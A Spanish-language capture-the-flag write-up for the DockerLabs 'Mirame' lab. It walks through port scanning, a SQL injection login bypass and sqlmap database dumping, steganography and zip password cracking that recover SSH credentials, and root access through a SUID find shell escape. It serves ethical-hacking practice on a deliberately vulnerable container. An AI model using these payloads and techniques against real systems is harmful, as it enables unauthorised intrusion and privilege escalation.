---
title: Mirame
description: DockerLabs es una plataforma gratuita diseñada para practicar hacking ético al alcance de todo el mundo utilizando Docker. DockerLabs ofrece un entorno seguro y accesible para desplegar laboratorios vulnerables de la forma más eficiente y sencilla posible.
date: 2024-12-31
toc: true
pin: false
image:
 path: /assets/img/dockerlabs-writeup-mirame/mirame_logo.png
categories:
  - Docker Labs
tags:
  - linux
  - dockerlabs
  - ssh
  - http
  - tcp
  - sqli blind
  - steganography
  - suid
  - information gathering
  - web analysis
  - vulnerability exploitation
  - privilege escalation

---
## Information Gathering

El análisis inicial comienza con el comando ping para confirmar la accesibilidad de la máquina objetivo en la red.

```terminal
/home/kali/Documents/dockerlabs/mirame:-$ ping -c 1 127.17.0.2
PING 127.17.0.2 (127.17.0.2) 56(84) bytes of data.
64 bytes from 127.17.0.2: icmp_seq=1 ttl=64 time=0.045 ms

--- 127.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.045/0.045/0.045/0.000 ms
```

Realizo un escaneo agresivo de puertos con nmap, lo que me permite identificar rápidamente todos los puertos abiertos.

```terminal
/home/kali/Documents/dockerlabs/mirame:-$ sudo namp -p- --open -sS --min-rate 5000 -n -Pn -vvv -oG nmap1 127.17.0.2
Host: 127.17.0.2 ()     Status: Up
Host: 127.17.0.2 ()     Ports: 22/open/tcp//ssh///, 80/open/tcp//http///        Ignored State: closed (65533)
```

Profundizo en los puertos detectados, recopilando información detallada sobre los servicios y versiones en ejecución.

```terminal
/home/kali/Documents/dockerlabs/mirame:-$ sudo nmap -sCV -p22,80 -vvv -oN nmap2 127.17.0.2
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 2c:ea:4a:d7:b4:c3:d4:e2:65:29:6c:12:c4:58:c9:49 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBD3x1ZS5sqr0S3YpDEotdxPKxnTcjRyebvMovrPsMsYYyiREu1eHgaMkGVXc69z7Q+U2+jxrMSeocpZRnRRYo4w=
|   256 a7:a4:a4:2e:3b:c6:0a:e4:ec:bd:46:84:68:02:5d:30 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEk0UoilrDZUZ7ebFNCQDhoE45xTyVNb9ASuhg1G76eE
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.61 ((Debian))
|_http-server-header: Apache/2.4.61 (Debian)
|_http-title: Login Page
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
```terminal
/home/kali/Documents/dockerlabs/mirame:-$ whatweb 127.17.0.2
http://127.17.0.2 [200 OK] Apache[2.4.61], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.61 (Debian)], IP[127.17.0.2], PasswordField[password], Title[Login Page] 
```

---
## Web Analysis

En el servicio web se encuentra un panel de inicio de sesión.

![](assets/img/dockerlabs-writeup-mirame/mirame1_1.png)
![](assets/img/dockerlabs-writeup-mirame/mirame1_2.png)

Rápidamente identifico que el sistema utiliza MariaDB, el cual es vulnerable a SQL injection.

![](assets/img/dockerlabs-writeup-mirame/mirame1_3.png)

Utilizando la siguiente consulta, verifico la cantidad de columnas disponibles en la consulta actual:

```sql
' ORDER BY 3-- -
```

![](assets/img/dockerlabs-writeup-mirame/mirame1_4.png)

El panel de inicio de sesión puede ser bypassado con la siguiente query:

```
admin'-- -
```

![](assets/img/dockerlabs-writeup-mirame/mirame1_5.png)

Sin embargo, al analizar la página ```page.php```, no logro identifica ninguna vulnerabilidad.

![](assets/img/dockerlabs-writeup-mirame/mirame1_6.png)

---
## Vulnerability Exploitation

La inyección SQL parece ser de tipo blind, por lo que la opción más rápida es utilizar SQLmap.

Primero, intercepto la consulta del panel con BurpSuite y guardo la request en un archivo ```request.txt```.

![](assets/img/dockerlabs-writeup-mirame/mirame2_1.png)

Luego, ejecuto SQLmap para identificar las bases de datos disponibles. Se detectan dos: ```infomation_schema``` y ```users```.

```terminal
/home/kali/Documents/dockerlabs/mirame:-$ sqlmap -r request.txt --dbs --dbms=mysql --batch
```

![](assets/img/dockerlabs-writeup-mirame/mirame2_2.png)

Ajusto el comando para apuntar a la base de datos ```users``` y enumero las tablas. Solo encuentro una: ```usuarios```.

```terminal
/home/kali/Documents/dockerlabs/mirame:-$ sqlmap -r request.txt -D users --tables --dbms=mysql --batch
```

![](assets/img/dockerlabs-writeup-mirame/mirame2_3.png)

Luego, ajusto el comando nuevamente para enumerar las columnas de la tabla ```usuarios```, verificando que efectivamente son las tres mencionadas: ```id```, ```password``` y ```username```.

```terminal
/home/kali/Documents/dockerlabs/mirame:-$ sqlmap -r request.txt -D users -T usuarios --columns --dbms=mysql --batch
```

![](assets/img/dockerlabs-writeup-mirame/mirame2_4.png)

Finalmente, dumpeo los datos de las columnas.

```terminal
/home/kali/Documents/dockerlabs/mirame:-$ sqlmap -r request.txt -D users -T usuarios --dump --dbms=mysql --batch
```

![](assets/img/dockerlabs-writeup-mirame/mirame2_5.png)

Ninguna de las credenciales dumpeadas resulta útil, pero la fila número 4 es definitivamente sospechosa.

Tras investigar más a fondo, encuentro que existe un directorio oculto que contiene una imagen llamada ```miramebien.jpg```.

![](assets/img/dockerlabs-writeup-mirame/mirame3_1.png)
![](assets/img/dockerlabs-writeup-mirame/mirame3_2.png)

```terminal
/home/kali/Documents/dockerlabs/mirame:-$ wget http://127.17.0.2/directoriotravieso/miramebien.jpg
```

Intento extraer los datos ocultos en la imagen utilizando steghide con la siguiente instrucción, pero no consigo extraer nada, ya que la contraseña proporcionada no es válida.

```terminal
/home/kali/Documents/dockerlabs/mirame:-$ steghide extract -sf miramebien.jpg
Enter passphrase: 
steghide: could not extract any data with that passphrase!
```

Utilizo stegseek con un ataque de diccionario, empleando el archivo ```rockyou.txt``` para intentar encontrar la contraseña correcta. El resultado se guarda en el archivo ```miramebien-out.txt```

```terminal
/home/kali/Documents/dockerlabs/mirame:-$ stegseek --crack miramebien.jpg /usr/share/wordlists/rockyou.txt miramebien-out.txt 
[i] Found passphrase: "chocolate"
[i] Original filename: "ocultito.zip".
[i] Extracting to "miramebien-out.txt".
```

De esa forma encuentro la contraseña correcta para steghide, que resulta ser ```chocolate```. Con esta contraseña, intento nuevamente extraer los datos ocultos en la imagen.

El resultado es un archivo oculto ```ocultito.zip```

```terminal
/home/kali/Documents/dockerlabs/mirame:-$ steghide extract -sf miramebien.jpg
Enter passphrase: chocolate
wrote extracted data to "ocultito.zip".
```

Al intentar descomprimir el archivo ```ocultito.zip```, se me solicita una contraseña con la cual no cuento.

```terminal
/home/kali/Documents/dockerlabs/mirame:-$ unzip ocultito.zip
Archive:  ocultito.zip
[ocultito.zip] secret.txt password:
   skipping: secret.txt              incorrect password
```

Para obtener la contraseña correcta, utilizo la herramienta zip2john para extraer la información del archivo comprimido y guardarla en el archivo ```oculto.txt```.

```terminal
/home/kali/Documents/dockerlabs/mirame:-$ zip2john ocultito.zip > oculto.txt
ver 1.0 efh 5455 efh 7875 ocultito.zip/secret.txt PKZIP Encr: 2b chk, TS_chk, cmplen=28, decmplen=16, crc=703553BA ts=9D7A cs=9d7a type=0
```

Ejecuto john sobre el archivo ```oculto.txt``` para realizar un ataque de fuerza bruta y encontrar la contraseña.

```terminal
/home/kali/Documents/dockerlabs/mirame:-$ john oculto.txt
```

![](assets/img/dockerlabs-writeup-mirame/mirame3_3.png)

Una vez que obtengo la contraseña, intento nuevamente descomprimir el archivo  ```ocultito.zip``` donde se encuentra el archivo ```secret.txt``` y encuentro las credenciales para conectarme por SSH.

```terminal
/home/kali/Documents/dockerlabs/mirame:-$ unzip ocultito.zip
Archive:  ocultito.zip
[ocultito.zip] secret.txt password: 
 extracting: secret.txt

/home/kali/Documents/dockerlabs/mirame:-$ cat secret.txt 
carlos:carlitos
```
```terminal
/home/kali/Documents/dockerlabs/mirame:-$ ssh carlos@127.17.0.2
carlos@127.17.0.2's password: carlitos

carlos@kali:~$ whoami
carlos
```

---
## Privilege Escalation

```terminal
carlos@kali:~$ cat /etc/passwd | grep /bash$
root:x:0:0:root:/root:/bin/bash
carlos:x:1000:1000:,,,:/home/carlos:/bin/bash
```

Busco archivos con el bit SUID, que permiten ejecutar programas con los privilegios del propietario del archivo.

```terminal
carlos@kali:~$ find / -perm -4000 2>/dev/null
/usr/bin/su
/usr/bin/mount
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/find
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/sudo
/usr/lib/mysql/plugin/auth_pam_tool_dir/auth_pam_tool
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
```

<https://gtfobins.github.io/gtfobins/find/#suid>

![](assets/img/dockerlabs-writeup-mirame/mirame4_1.png)

Utilizo ```find``` con un comando ```-exec``` que ejecuta ```/bin/sh``` en un entorno con privilegios elevados ```-p```, lo que me otorga privilegios de administrador en el sistema.

```terminal
carlos@kali:~$ find . -exec /bin/sh -p \; -quit
# id
uid=1000(carlos) gid=1000(carlos) euid=0(root) groups=1000(carlos),100(users)
```
